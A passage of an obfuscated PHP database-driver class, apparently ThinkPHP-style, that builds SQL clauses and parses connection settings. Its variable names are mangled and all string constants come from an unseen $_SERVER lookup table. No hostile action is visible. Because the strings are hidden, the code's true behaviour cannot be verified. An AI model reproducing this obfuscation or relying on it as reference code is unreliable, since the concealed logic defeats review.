. $î›Ñ…‡â); } return $è‡ºáÉÛ; } public function __call($›Ãœ¼Ó³, $£ä˜”–) { if (method_exists($this, $›Ãœ¼Ó³)) { return call_user_func_array(array($this, $›Ãœ¼Ó³), $£ä˜”–); } } protected function _getDsnType($Ó¼¾ÀÄ—) { $Ü¨£¨Ô¿ = explode($_SERVER[™»È’øè][4], $Ó¼¾ÀÄ—); $îœ’Ç„Ö = strtoupper(trim($Ü¨£¨Ô¿[0])); return $îœ’Ç„Ö; } private function parseConfig($ñ®–ôÀÌ = '') { $ø•÷üÊ =& $_SERVER[™»È’øè]; if (!empty($ñ®–ôÀÌ) && is_string($ñ®–ôÀÌ)) { $ñ®–ôÀÌ = $this->parseDSN($ñ®–ôÀÌ); } elseif (is_array($ñ®–ôÀÌ)) { $ñ®–ôÀÌ = array_change_key_case($ñ®–ôÀÌ); $ñ®–ôÀÌ = array($ø•÷üÊ[991] => $ñ®–ôÀÌ[$ø•÷üÊ[997]], $ø•÷üÊ[918] => $ñ®–ôÀÌ[$ø•÷üÊ[998]], $ø•÷üÊ[919] => $ñ®–ôÀÌ[$ø•÷üÊ[999]], $ø•÷üÊ[916] => $ñ®–ôÀÌ[$ø•÷üÊ[1000]], $ø•÷üÊ[917] => $ñ®–ôÀÌ[$ø•÷üÊ[1001]], $ø•÷üÊ[21] => $ñ®–ôÀÌ[$ø•÷üÊ[1002]], $ø•÷üÊ[946] => $ñ®–ôÀÌ[$ø•÷üÊ[1003]], $ø•÷üÊ[17] => isset($ñ®–ôÀÌ[$ø•÷üÊ[1004]]) ? $ñ®–ôÀÌ[$ø•÷üÊ[1004]] : array()); } elseif (empty($ñ®–ôÀÌ)) { if (think_config($ø•÷üÊ[1005]) && $ø•÷üÊ[994] != strtolower(think_config($ø•÷üÊ[1006]))) { $ñ®–ôÀÌ = $this->parseDSN(think_config($ø•÷üÊ[1005])); } else { $ñ®–ôÀÌ = array($ø•÷üÊ[991] => think_config($ø•÷üÊ[1006]), $ø•÷üÊ[918] => think_config($ø•÷üÊ[1007]), $ø•÷üÊ[919] => think_config($ø•÷üÊ[1008]), $ø•÷üÊ[916] => think_config($ø•÷üÊ[1009]), $ø•÷üÊ[917] => think_config($ø•÷üÊ[1010]), $ø•÷üÊ[21] => think_config($ø•÷üÊ[289]), $ø•÷üÊ[946] => think_config($ø•÷üÊ[1005]), $ø•÷üÊ[17] => think_config($ø•÷üÊ[1011])); } } return $ñ®–ôÀÌ; } protected function initConnect($Ú¦©©¬ = true) { if (1 == think_config($_SERVER[™»È’øè][22])) { $this->_linkID = $this->multiConnect($Ú¦©©¬); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ÏÙ¿÷‰˜ => $Üğ÷¨à) { $this->_linkID = $Üğ÷¨à; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($à¶­Ü© = false) { $×˜µ¥Û¬ =& $_SERVER[™»È’øè]; static $òé¦†×ò = array(); static $ÓĞœåÂÏ = -1; if (empty($òé¦†×ò)) { foreach ($this->config as $¡°·‹ÜĞ => $ê¢ı°Ú) { $òé¦†×ò[$¡°·‹ÜĞ] = explode($×˜µ¥Û¬[50], $ê¢ı°Ú); } } if (think_config($×˜µ¥Û¬[1012])) { if ($à¶­Ü© || think_config($×˜µ¥Û¬[438]) === !0) { $›Ÿç— = floor(mt_rand(0, think_config($×˜µ¥Û¬[1013]) - 1)); $ÓĞœåÂÏ = $›Ÿç—; } else { if (is_numeric(think_config($×˜µ¥Û¬[1014]))) { $›Ÿç— = think_config($×˜µ¥Û¬[1014]); } else { $›Ÿç— = floor(mt_rand(think_config($×˜µ¥Û¬[1013]), count($òé¦†×ò[$×˜µ¥Û¬[916]]) - 1)); } } } else { $›Ÿç— = floor(mt_rand(0, count($òé¦†×ò[$×˜µ¥Û¬[916]]) - 1)); $ÓĞœåÂÏ = $›Ÿç—; } $›Ÿç— = $ÓĞœåÂÏ !== -1 ? $ÓĞœåÂÏ : $›Ÿç—; $ºâ¡Œè× = array($×˜µ¥Û¬[918] => isset($òé¦†×ò[$×˜µ¥Û¬[918]][$›Ÿç—]) ? $òé¦†×ò[$×˜µ¥Û¬[918]][$›Ÿç—] : $òé¦†×ò[$×˜µ¥Û¬[918]][0], $×˜µ¥Û¬[919] => isset($òé¦†×ò[$×˜µ¥Û¬[919]][$›Ÿç—]) ? $òé¦†×ò[$×˜µ¥Û¬[919]][$›Ÿç—] : $òé¦†×ò[$×˜µ¥Û¬[919]][0], $×˜µ¥Û¬[916] => isset($òé¦†×ò[$×˜µ¥Û¬[916]][$›Ÿç—]) ? $òé¦†×ò[$×˜µ¥Û¬[916]][$›Ÿç—] : $òé¦†×ò[$×˜µ¥Û¬[916]][0], $×˜µ¥Û¬[917] => isset($òé¦†×ò[$×˜µ¥Û¬[917]][$›Ÿç—]) ? $òé¦†×ò[$×˜µ¥Û¬[917]][$›Ÿç—] : $òé¦†×ò[$×˜µ¥Û¬[917]][0], $×˜µ¥Û¬[21] => isset($òé¦†×ò[$×˜µ¥Û¬[21]][$›Ÿç—]) ? $òé¦†×ò[$×˜µ¥Û¬[21]][$›Ÿç—] : $òé¦†×ò[$×˜µ¥Û¬[21]][0], $×˜µ¥Û¬[946] => isset($òé¦†×ò[$×˜µ¥Û¬[946]][$›Ÿç—]) ? $òé¦†×ò[$×˜µ¥Û¬[946]][$›Ÿç—] : $òé¦†×ò[$×˜µ¥Û¬[946]][0], $×˜µ¥Û¬[17] => isset($òé¦†×ò[$×˜µ¥Û¬[17]][$›Ÿç—]) ? $òé¦†×ò[$×˜µ¥Û¬[17]][$›Ÿç—] : $òé¦†×ò[$×˜µ¥Û¬[17]][0]); return $this->connect($ºâ¡Œè×, $›Ÿç—); } public function parseDSN($–Úã¿¦À) { $ÀËäŠï– =& $_SERVER[™»È’øè]; if (empty($–Úã¿¦À)) { return !1; } $Â§Ìåë’ = parse_url($–Úã¿¦À); if ($Â§Ìåë’[$ÀËäŠï–[194]]) { $Õú¸Ùï¿ = array($ÀËäŠï–[991] => $Â§Ìåë’[$ÀËäŠï–[194]], $ÀËäŠï–[918] => isset($Â§Ìåë’[$ÀËäŠï–[629]]) ? $Â§Ìåë’[$ÀËäŠï–[629]] : $ÀËäŠï–[12], $ÀËäŠï–[919] => isset($Â§Ìåë’[$ÀËäŠï–[1015]]) ? $Â§Ìåë’[$ÀËäŠï–[1015]] : $ÀËäŠï–[12], $ÀËäŠï–[916] => isset($Â§Ìåë’[$ÀËäŠï–[195]]) ? $Â§Ìåë’[$ÀËäŠï–[195]] : $ÀËäŠï–[12], $ÀËäŠï–[917] => isset($Â§Ìåë’[$ÀËäŠï–[196]]) ? $Â§Ìåë’[$ÀËäŠï–[196]] : $ÀËäŠï–[12], $ÀËäŠï–[21] => isset($Â§Ìåë’[$ÀËäŠï–[84]]) ? substr($Â§Ìåë’[$ÀËäŠï–[84]], 1) : $ÀËäŠï–[12]); } else { preg_match($ÀËäŠï–[1016], trim($–Úã¿¦À), $¥ëæ›è™); $Õú¸Ùï¿ = array($ÀËäŠï–[991] => $¥ëæ›è™[1], $ÀËäŠï–[918] => $¥ëæ›è™[2], $ÀËäŠï–[919] => $¥ëæ›è™[3], $ÀËäŠï–[916] => $¥ëæ›è™[4], $ÀËäŠï–[917] => $¥ëæ›è™[5], $ÀËäŠï–[21] => $¥ëæ›è™[6]); } $Õú¸Ùï¿[$ÀËäŠï–[946]] = $ÀËäŠï–[12]; return $Õú¸Ùï¿; } protected function debug() { $Ø­Ù¥¿Ñ =& $_SERVER[™»È’øè]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ø­Ù¥¿Ñ[1017]; if (think_config($Ø­Ù¥¿Ñ[1018])) { think_status($Ø­Ù¥¿Ñ[1019]); think_trace($this->queryStr . $Ø­Ù¥¿Ñ[1020] . think_status($Ø­Ù¥¿Ñ[24], $Ø­Ù¥¿Ñ[1019], 6) . $Ø­Ù¥¿Ñ[1021], $Ø­Ù¥¿Ñ[12], $Ø­Ù¥¿Ñ[1022]); } } protected function parseLock($‘©İÀÜÇ = false) { $ÇŸë‘“Š =& $_SERVER[™»È’øè]; if (!$‘©İÀÜÇ) { return $ÇŸë‘“Š[12]; } if ($ÇŸë‘“Š[948] == $this->dbType) { return $ÇŸë‘“Š[1023]; } return $ÇŸë‘“Š[1024]; } protected function parseSet($³à¬ä¼ß) { $¨Ù ³ì =& $_SERVER[™»È’øè]; foreach ($³à¬ä¼ß as $óçßãš => $ì»ÔŒŒá) { if (is_array($ì»ÔŒŒá) && $¨Ù ³ì[340] == $ì»ÔŒŒá[0]) { $èœ¥‚Ã·[] = $this->parseKey($óçßãš) . $¨Ù ³ì[914] . $ì»ÔŒŒá[1]; } elseif (is_scalar($ì»ÔŒŒá) || is_null($ì»ÔŒŒá)) { $èœ¥‚Ã·[] = $this->parseKey($óçßãš) . $¨Ù ³ì[914] . $this->parseValue($ì»ÔŒŒá); } } return $¨Ù ³ì[1025] . implode($¨Ù ³ì[50], $èœ¥‚Ã·); } protected function bindParam($÷ÌÅôŒ, $ë±çÖË) { $this->bind[$_SERVER[™»È’øè][4] . $÷ÌÅôŒ] = $ë±çÖË; } protected function parseBind($ÂŒ„½å) { $ÂŒ„½å = array_merge($this->bind, $ÂŒ„½å); $this->bind = array(); return $ÂŒ„½å; } function parseKey(&$…ŸĞóäµ, $…‹ª¹š— = true) { if ($…‹ª¹š—) { $…ŸĞóäµ = $this->parseKeyCheck($…ŸĞóäµ); } return $…ŸĞóäµ; } function parseKeyCheck($ëÎ•åË) { $Ÿ„ó¯Äæ =& $_SERVER[™»È’øè]; $ëÎ•åË = trim($ëÎ•åË); if (!preg_match($Ÿ„ó¯Äæ[1026], $ëÎ•åË)) { think_exception($Ÿ„ó¯Äæ[1027] . $ëÎ•åË); } return $ëÎ•åË; } protected function parseValue($Èõ–ĞÏœ) { $ÇÎİÖÌ =& $_SERVER[™»È’øè]; if (is_string($Èõ–ĞÏœ)) { $Èõ–ĞÏœ = $ÇÎİÖÌ[987] . $this->escapeString($Èõ–ĞÏœ) . $ÇÎİÖÌ[987]; } elseif (isset($Èõ–ĞÏœ[0]) && is_string($Èõ–ĞÏœ[0]) && strtolower($Èõ–ĞÏœ[0]) == $ÇÎİÖÌ[340]) { $Èõ–ĞÏœ = $this->escapeString($Èõ–ĞÏœ[1]); } elseif (is_array($Èõ–ĞÏœ)) { $Èõ–ĞÏœ = array_map(array($this, $ÇÎİÖÌ[988]), $Èõ–ĞÏœ); } elseif (is_bool($Èõ–ĞÏœ)) { $Èõ–ĞÏœ = $Èõ–ĞÏœ ? $ÇÎİÖÌ[88] : $ÇÎİÖÌ[211]; } elseif (is_null($Èõ–ĞÏœ)) { $Èõ–ĞÏœ = $ÇÎİÖÌ[103]; } return $Èõ–ĞÏœ; } protected function parseField($‹¦µÅÓÈ) { $ä§ˆïËƒ =& $_SERVER[™»È’øè]; if (is_string($‹¦µÅÓÈ) && strpos($‹¦µÅÓÈ, $ä§ˆïËƒ[50])) { $‹¦µÅÓÈ = explode($ä§ˆïËƒ[50], $‹¦µÅÓÈ); } if (is_array($‹¦µÅÓÈ)) { $ÌïÁÈ° = array(); foreach ($‹¦µÅÓÈ as $æ÷‘ÌÜ½ => $Ş…€¸€) { if (!is_numeric($æ÷‘ÌÜ½)) { $ÌïÁÈ°[] = $this->parseKey($æ÷‘ÌÜ½, !1) . $ä§ˆïËƒ[1028] . $this->parseKey($Ş…€¸€); } else { $ÌïÁÈ°[] = $this->parseKey($Ş…€¸€); } } $ıÊ ÈÁ‹ = implode($ä§ˆïËƒ[50], $ÌïÁÈ°); } elseif (is_string($‹¦µÅÓÈ) && !empty($‹¦µÅÓÈ)) { $ıÊ ÈÁ‹ = $‹¦µÅÓÈ; } else { $ıÊ ÈÁ‹ = $ä§ˆïËƒ[202]; } return $ıÊ ÈÁ‹; } protected function parseTable($Ñğ´Ğªè) { $Ëë¯Ö¨ö =& $_SERVER[™»È’øè]; if (is_array($Ñğ´Ğªè)) { $‚Úùëî = array(); foreach ($Ñğ´Ğªè as $ÚÊ’íãå => $µÌÀ×ÛÒ) { if (!is_numeric($ÚÊ’íãå)) { $‚Úùëî[] = $this->parseKey($ÚÊ’íãå) . $Ëë¯Ö¨ö[53] . $this->parseKey($µÌÀ×ÛÒ); } else { $‚Úùëî[] = $this->parseKey($ÚÊ’íãå); } } $Ñğ´Ğªè = $‚Úùëî; } elseif (is_string($Ñğ´Ğªè)) { if (strstr($Ñğ´Ğªè, $Ëë¯Ö¨ö[53])) { return $Ñğ´Ğªè; } $Ñğ´Ğªè = explode($Ëë¯Ö¨ö[50], $Ñğ´Ğªè); array_walk($Ñğ´Ğªè, array($this, $Ëë¯Ö¨ö[936])); } return $Ëë¯Ö¨ö[930] . trim(implode($Ëë¯Ö¨ö[1029], $Ñğ´Ğªè), $Ëë¯Ö¨ö[428]) . $Ëë¯Ö¨ö[930]; } protected function parseWhere($”Ç‘¿ÙÚ) { $ßÕûÚÃÌ =& $_SERVER[™»È’øè]; $şÒ´Ş®î = $ßÕûÚÃÌ[12]; if (is_string($”Ç‘¿ÙÚ)) { $şÒ´Ş®î = $”Ç‘¿ÙÚ; } else { $şÉ”…ï = isset($”Ç‘¿ÙÚ[$ßÕûÚÃÌ[1030]]) ? strtoupper($”Ç‘¿ÙÚ[$ßÕûÚÃÌ[1030]]) : $ßÕûÚÃÌ[12]; if (in_array($şÉ”…ï, array($ßÕûÚÃÌ[1031], $ßÕûÚÃÌ[1032], $ßÕûÚÃÌ[1033]))) { $şÉ”…ï = $ßÕûÚÃÌ[53] . $şÉ”…ï . $ßÕûÚÃÌ[53]; unset($”Ç‘¿ÙÚ[$ßÕûÚÃÌ[1030]]); } else { $şÉ”…ï = $ßÕûÚÃÌ[1034]; } foreach ($”Ç‘¿ÙÚ as $œ”‘«•º => $·Ñˆ¹’) { $şÒ´Ş®î .= $ßÕûÚÃÌ[320]; if (is_numeric($œ”‘«•º)) { $œ”‘«•º = $ßÕûÚÃÌ[1035]; } if (0 === strpos($œ”‘«•º, $ßÕûÚÃÌ[11])) { $şÒ´Ş®î .= $this->parseThinkWhere($œ”‘«•º, $·Ñˆ¹’); } else { if (!preg_match($ßÕûÚÃÌ[1036], trim($œ”‘«•º))) { think_exception(think_lang($ßÕûÚÃÌ[1037]) . $ßÕûÚÃÌ[4] . $œ”‘«•º); } $ß©¾ï = is_array($·Ñˆ¹’) && isset($·Ñˆ¹’[$ßÕûÚÃÌ[1038]]); $œ”‘«•º = trim($œ”‘«•º); if (strpos($œ”‘«•º, $ßÕûÚÃÌ[326])) { $©Ã›„‰… = explode($ßÕûÚÃÌ[326], $œ”‘«•º); $•„İ¦Ó³ = array(); foreach ($©Ã›„‰… as $¦Ô ‚Ñ => $’æô¡Ö) { $«Ä·Ìî = $ß©¾ï ? $·Ñˆ¹’[$¦Ô ‚Ñ] : $·Ñˆ¹’; $•„İ¦Ó³[] = $ßÕûÚÃÌ[303] . $this->parseWhereItem($this->parseKey($’æô¡Ö), $«Ä·Ìî) . $ßÕûÚÃÌ[935]; } $şÒ´Ş®î .= implode($ßÕûÚÃÌ[1039], $•„İ¦Ó³); } elseif (strpos($œ”‘«•º, $ßÕûÚÃÌ[327])) { $©Ã›„‰… = explode($ßÕûÚÃÌ[327], $œ”‘«•º); $•„İ¦Ó³ = array(); foreach ($©Ã›„‰… as $¦Ô ‚Ñ => $’æô¡Ö) { $«Ä·Ìî = $ß©¾ï ? $·Ñˆ¹’[$¦Ô ‚Ñ] : $·Ñˆ¹’; $•„İ¦Ó³[] = $ßÕûÚÃÌ[303] . $this->parseWhereItem($this->parseKey($’æô¡Ö), $«Ä·Ìî) . $ßÕûÚÃÌ[935]; } $şÒ´Ş®î .= implode($ßÕûÚÃÌ[1034], $•„İ¦Ó³); } else { $şÒ´Ş®î .= $this->parseWhereItem($this->parseKey($œ”‘«•º), $·Ñˆ¹’); } } $şÒ´Ş®î .= $ßÕûÚÃÌ[321] . $şÉ”…ï; } $şÒ´Ş®î = substr($şÒ´Ş®î, 0, -strlen($şÉ”…ï)); } return empty($şÒ´Ş®î) ? $ßÕûÚÃÌ[12] : $ßÕûÚÃÌ[1040] . $şÒ´Ş®î; } protected function parseWhereItem($á•×ï¤”, $©°æâ‘) { $÷Şò‡û =& $_SERVER[™»È’øè]; $Ë¢§©ü = $÷Şò‡û[12]; if (is_array($©°æâ‘)) { if (is_string($©°æâ‘[0])) { $ºùÎàÎò = strtolower($©°æâ‘[0]); if (in_array($©°æâ‘[0], array($÷Şò‡û[914], $÷Şò‡û[1041], $÷Şò‡û[1042], $÷Şò‡û[1043], $÷Şò‡û[1044], $÷Şò‡û[1045]))) { $Ë¢§©ü .= $á•×ï¤” . $÷Şò‡û[53] . $©°æâ‘[0] . $÷Şò‡û[53] . $this->parseValue($©°æâ‘[1]); } elseif (preg_match($÷Şò‡û[1046], $©°æâ‘[0])) { $Ë¢§©ü .= $á•×ï¤” . $÷Şò‡û[53] . $this->exp[$ºùÎàÎò] . $÷Şò‡û[53] . $this->parseValue($©°æâ‘[1]); } elseif (preg_match($÷Şò‡û[1047], $©°æâ‘[0])) { if (is_array($©°æâ‘[1])) { $©õéêÂğ = isset($©°æâ‘[2]) ? strtoupper($©°æâ‘[2]) : $÷Şò‡û[1032]; if (in_array($©õéêÂğ, array($÷Şò‡û[1031], $÷Şò‡û[1032], $÷Şò‡û[1033]))) { $Ï“Ó†¢½ = array(); foreach ($©°æâ‘[1] as $ÖÍ¢Ş›±) { $Ï“Ó†¢½[] = $á•×ï¤” . $÷Şò‡û[53] . $this->exp[$ºùÎàÎò] . $÷Şò‡û[53] . $this->parseValue($ÖÍ¢Ş›±); } $Ë¢§©ü .= $÷Şò‡û[303] . implode($÷Şò‡û[53] . $©õéêÂğ . $÷Şò‡û[53], $Ï“Ó†¢½) . $÷Şò‡û[935]; } } else { $Ë¢§©ü .= $á•×ï¤” . $÷Şò‡û[53] . $this->exp[$ºùÎàÎò] . $÷Şò‡û[53] . $this->parseValue($©°æâ‘[1]); } } elseif ($÷Şò‡û[340] == $ºùÎàÎò) { $Ë¢§©ü .= $÷Şò‡û[933] . $á•×ï¤” . $÷Şò‡û[53] . $©°æâ‘[1] . $÷Şò‡û[1048]; } elseif (preg_match($÷Şò‡û[1049], $©°æâ‘[0])) { $Ë¢§©ü .= $©°æâ‘[0]; } elseif (preg_match($÷Şò‡û[1050], $©°æâ‘[0])) { if (isset($©°æâ‘[2]) && $÷Şò‡û[340] == $©°æâ‘[2]) { $Ë¢§©ü .= $á•×ï¤” . $÷Şò‡û[53] . $this->exp[$ºùÎàÎò] . $÷Şò‡û[53] . $©°æâ‘[1]; } else { if (is_string($©°æâ‘[1])) { $©°æâ‘[1] = explode($÷Şò‡û[50], $©°æâ‘[1]); } $Ô¼üóßÛ = implode($÷Şò‡û[50], $this->parseValue($©°æâ‘[1])); $Ë¢§©ü .= $á•×ï¤” . $÷Şò‡û[53] . $this->exp[$ºùÎàÎò] . $÷Şò‡û[933] . $Ô¼üóßÛ . $÷Şò‡û[935]; } } elseif (preg_match($÷Şò‡û[1051], $©°æâ‘[0])) { $¿Ÿ˜§œÆ = is_string($©°æâ‘[1]) ? explode($÷Şò‡û[50], $©°æâ‘[1]) : $©°æâ‘[1]; $Ë¢§©ü .= $÷Şò‡û[933] . $á•×ï¤” . $÷Şò‡û[53] . $this->exp[$ºùÎàÎò] . $÷Şò‡û[53] . $this->parseValue($¿Ÿ˜§œÆ[0]) . $÷Şò‡û[1034] . $this->parseValue($¿Ÿ˜§œÆ[1]) . $÷Şò‡û[321]; } else { think_exception(think_lang($÷Şò‡û[1037]) . $÷Şò‡û[4] . $©°æâ‘[0]); } } else { $øâ£ó’¿ = count($©°æâ‘); $›Ÿğœé‡ = $÷Şò‡û[12]; if (is_string($©°æâ‘[$øâ£ó’¿ - 1])) { $›Ÿğœé‡ = isset($©°æâ‘[$øâ£ó’¿ - 1]) ? strtoupper($©°æâ‘[$øâ£ó’¿ - 1]) : $÷Şò‡û[12]; if (in_array($›Ÿğœé‡, array($÷Şò‡û[1031], $÷Şò‡û[1032], $÷Şò‡û[1033]))) { $øâ£ó’¿ = $øâ£ó’¿ - 1; } } else { $›Ÿğœé‡ = $÷Şò‡û[1031]; } for ($Ä³Ì¸Æú = 0; $Ä³Ì¸Æú < $øâ£ó’¿; $Ä³Ì¸Æú++) { $¿Ÿ˜§œÆ = is_array($©°æâ‘[$Ä³Ì¸Æú]) ? $©°æâ‘[$Ä³Ì¸Æú][1] : $©°æâ‘[$Ä³Ì¸Æú]; if ($÷Şò‡û[340] == strtolower($©°æâ‘[$Ä³Ì¸Æú][0])) { $Ë¢§©ü .= $÷Şò‡û[303] . $á•×ï¤” . $÷Şò‡û[53] . $¿Ÿ˜§œÆ . $÷Şò‡û[1048] . $›Ÿğœé‡ . $÷Şò‡û[53]; } else { $Ğººü¸ = is_array($©°æâ‘[$Ä³Ì¸Æú]) ? $this->exp[strtolower($©°æâ‘[$Ä³Ì¸Æú][0])] : $÷Şò‡û[914]; if (!$Ğººü¸ && is_array($©°æâ‘[$Ä³Ì¸Æú]) && in_array($©°æâ‘[$Ä³Ì¸Æú][0], array($÷Şò‡û[914], $÷Şò‡û[1041], $÷Şò‡û[1042], $÷Şò‡û[1043], $÷Şò‡û[1044], $÷Şò‡û[1045]))) { $Ğººü¸ = $©°æâ‘[$Ä³Ì¸Æú][0]; } $Ë¢§©ü .= $÷Şò‡û[303] . $á•×ï¤” . $÷Şò‡û[53] . $Ğººü¸ . $÷Şò‡û[53] . $this->parseValue($¿Ÿ˜§œÆ) . $÷Şò‡û[1048] . $›Ÿğœé‡ . $÷Şò‡û[53]; } } $Ë¢§©ü = substr($Ë¢§©ü, 0, -4); } } else { $Ë¢§©ü .= $á•×ï¤” . $÷Şò‡û[1052] . $this->parseValue($©°æâ‘); } return $Ë¢§©ü; } protected function parseThinkWhere($ß€˜ô, $ôßß‰ÒÓ) { $²ºÊ‹ÓÙ =& $_SERVER[™»È’øè]; $ÏèïÇ² = $²ºÊ‹ÓÙ[12]; switch ($ß€˜ô) { case $²ºÊ‹ÓÙ[395]: $ÏèïÇ² = $ôßß‰ÒÓ; break; case $²ºÊ‹ÓÙ[1035]: $ÏèïÇ² = is_string($ôßß‰ÒÓ) ? $ôßß‰ÒÓ : substr($this->parseWhere($ôßß‰ÒÓ), 6); break; case $²ºÊ‹ÓÙ[1053]: parse_str($ôßß‰ÒÓ, $ “¬œ€¸); if (isset($ “¬œ€¸[$²ºÊ‹ÓÙ[1030]])) { $š‚‰•ñİ = $²ºÊ‹ÓÙ[53] . strtoupper($ “¬œ€¸[$²ºÊ‹ÓÙ[1030]]) . $²ºÊ‹ÓÙ[53]; unset($ “¬œ€¸[$²ºÊ‹ÓÙ[1030]]); } else { $š‚‰•ñİ = $²ºÊ‹ÓÙ[1034]; } $¼Ìúóì± = array(); foreach ($ “¬œ€¸ as $È¸Óè¼ => $èšµËê) { $¼Ìúóì±[] = $this->parseKey($È¸Óè¼) . $²ºÊ‹ÓÙ[1052] . $this->parseValue($èšµËê); } $ÏèïÇ² = implode($š‚‰•ñİ, $¼Ìúóì±); break; } return $ÏèïÇ²; } protected function parseLimit($Ëê³¿˜¥) { $İû–ØÕ =& $_SERVER[™»È’øè]; return !empty($Ëê³¿˜¥) ? $İû–ØÕ[51] . $Ëê³¿˜¥ . $İû–ØÕ[53] : $İû–ØÕ[12]; } protected function parseJoin($óÇ«™Õ˜) { $¼ú¬­ìÇ =& $_SERVER[™»È’øè]; $Ç‚§«ï = $¼ú¬­ìÇ[12]; if (!empty($óÇ«™Õ˜)) { if (is_array($óÇ«™Õ˜)) { foreach ($óÇ«™Õ˜ as $…ŒŠèÁÉ => $—î™ğ) { if (!1 !== stripos($—î™ğ, $¼ú¬­ìÇ[1054])) { $Ç‚§«ï .= $¼ú¬­ìÇ[53] . $—î™ğ; } else { $Ç‚§«ï .= $¼ú¬­ìÇ[1055] . $—î™ğ; } } } else { $Ç‚§«ï .= $¼ú¬­ìÇ[1055] . $óÇ«™Õ˜; } } $Ç‚§«ï = preg_replace($¼ú¬­ìÇ[1056], think_config($¼ú¬­ìÇ[960]) . $¼ú¬­ìÇ[1057], $Ç‚§«ï); return $Ç‚§«ï; } protected function parseOrder($ƒˆ¶øáŠ) { $±ú¶ƒçÊ =& $_SERVER[™»È’øè]; if (is_array($ƒˆ¶øáŠ)) { $å¦Ú§é = array(); foreach ($ƒˆ¶øáŠ as $®“’ªáä => $¢ûœâ) { if (is_numeric($®“’ªáä)) { $å¦Ú§é[] = $this->parseKey($¢ûœâ); } else { $¢ûœâ = in_array(strtoupper(trim($¢ûœâ)), array($±ú¶ƒçÊ[1058], $±ú¶ƒçÊ[1059])) ? $±ú¶ƒçÊ[53] . $¢ûœâ : $±ú¶ƒçÊ[12]; if (preg_match($±ú¶ƒçÊ[1060], $®“’ªáä)) { $å¦Ú§é[] = $this->parseKey($®“’ªáä) . $¢ûœâ; } else { think_exception($±ú¶ƒçÊ[1061] . $®“’ªáä); } } } $ƒˆ¶øáŠ = implode($±ú¶ƒçÊ[50], $å¦Ú§é); } return !empty($ƒˆ¶øáŠ) ? $±ú¶ƒçÊ[1062] . $ƒˆ¶øáŠ : $±ú¶ƒçÊ[12]; } protected function parseGroup($º¼Ä±ı) { $«¦‰Ï™Ê =& $_SERVER[™»È’øè]; return !empty($º¼Ä±ı) ? $«¦‰Ï™Ê[1063] . $º¼Ä±ı : $«¦‰Ï™Ê[12]; } protected function parseHaving($Öäóö‹Ü) { $§“¥ÈÕ¶ =& $_SERVER[™»È’øè]; return !empty($Öäóö‹Ü) ? $§“¥ÈÕ¶[1064] . $Öäóö‹Ü : $§“¥ÈÕ¶[12]; } protected function parseComment($ñ‡û”ùÓ) { $‹‰ŒÚÜƒ =& $_SERVER[™»È’øè]; return !empty($ñ‡û”ùÓ) ? $‹‰ŒÚÜƒ[1065] . $ñ‡û”ùÓ . $‹‰ŒÚÜƒ[1066] : $‹‰ŒÚÜƒ[12]; } protected function parseDistinct($Òó´ë­Ã) { $ÛîÜÏæ± =& $_SERVER[™»È’øè]; return !empty($Òó´ë­Ã) ? $ÛîÜÏæ±[1067] : $ÛîÜÏæ±[12]; } protected function parseUnion($ƒ‘°ığ·) { $çöŞ½„Š =& $_SERVER[™»È’øè]; if (empty($ƒ‘°ığ·)) { return $çöŞ½„Š[12]; } if (isset($ƒ‘°ığ·[$çöŞ½„Š[391]])) { $çÊô³ = $çöŞ½„Š[1068]; unset($ƒ‘°ığ·[$çöŞ½„Š[391]]); } else { $çÊô³ = $çöŞ½„Š[1069]; } foreach ($ƒ‘°ığ· as $À¦¹Ø¿Ã) { $¥ï²›Šµ[] = $çÊô³ . (is_array($À¦¹Ø¿Ã) ? $this->buildSelectSql($À¦¹Ø¿Ã) : $À¦¹Ø¿Ã); } return implode($çöŞ½„Š[53], $¥ï²›Šµ); } public function insert($Ï¾á¢ïƒ, $ï¡ï¶”” = array(), $»·É©ôè = false) { $ÃŸÚÎØ© =& $_SERVER[™»È’øè]; $ŞĞ©Íéï = $¢£àÖĞ = array(); $this->model = $ï¡ï¶””[$ÃŸÚÎØ©[324]]; foreach ($Ï¾á¢ïƒ as $¤³Ëõ¿Ú => $š¿õ³ü°) { if (is_array($š¿õ³ü°) && $ÃŸÚÎØ©[340] == $š¿õ³ü°[0]) { $¢£àÖĞ[] = $this->parseKey($¤³Ëõ¿Ú); $ŞĞ©Íéï[] = $š¿õ³ü°[1]; } elseif (is_scalar($š¿õ³ü°) || is_null($š¿õ³ü°)) { $¢£àÖĞ[] = $this->parseKey($¤³Ëõ¿Ú); $ŞĞ©Íéï[] = $this->parseValue($š¿õ³ü°); } } $É‡æš¹Ó = ($»·É©ôè ? $ÃŸÚÎØ©[937] : $ÃŸÚÎØ©[938]) . $ÃŸÚÎØ©[939] . $this->parseTable($ï¡ï¶””[$ÃŸÚÎØ©[322]]) . $ÃŸÚÎØ©[933] . implode($ÃŸÚÎØ©[50], $¢£àÖĞ) . $ÃŸÚÎØ©[934] . implode($ÃŸÚÎØ©[50], $ŞĞ©Íéï) . $ÃŸÚÎØ©[935]; $É‡æš¹Ó .= $this->parseLock(isset($ï¡ï¶””[$ÃŸÚÎØ©[869]]) ? $ï¡ï¶””[$ÃŸÚÎØ©[869]] : !1); $É‡æš¹Ó .= $this->parseComment(!empty($ï¡ï¶””[$ÃŸÚÎØ©[397]]) ? $ï¡ï¶””[$ÃŸÚÎØ©[397]] : $ÃŸÚÎØ©[12]); return $this->execute($É‡æš¹Ó, $this->parseBind(!empty($ï¡ï¶””[$ÃŸÚÎØ©[328]]) ? $ï¡ï¶””[$ÃŸÚÎØ©[328]] : array())); } public function selectInsert($ø½Ü†½, $ò÷¦´³Š, $èšªÊô = array()) { $ÀÛ›…Ì =& $_SERVER[™»È’øè]; $this->model = $èšªÊô[$ÀÛ›…Ì[324]]; if (is_string($ø½Ü†½)) { $ø½Ü†½ = explode($ÀÛ›…Ì[50], $ø½Ü†½); } array_walk($ø½Ü†½, array($this, $ÀÛ›…Ì[936])); $áé›èÆ­ = $ÀÛ›…Ì[1070] . $this->parseTable($ò÷¦´³Š) . $ÀÛ›…Ì[933] . implode($ÀÛ›…Ì[50], $ø½Ü†½) . $ÀÛ›…Ì[1048]; $áé›èÆ­ .= $this->buildSelectSql($èšªÊô); return $this->execute($áé›èÆ­, $this->parseBind(!empty($èšªÊô[$ÀÛ›…Ì[328]]) ? 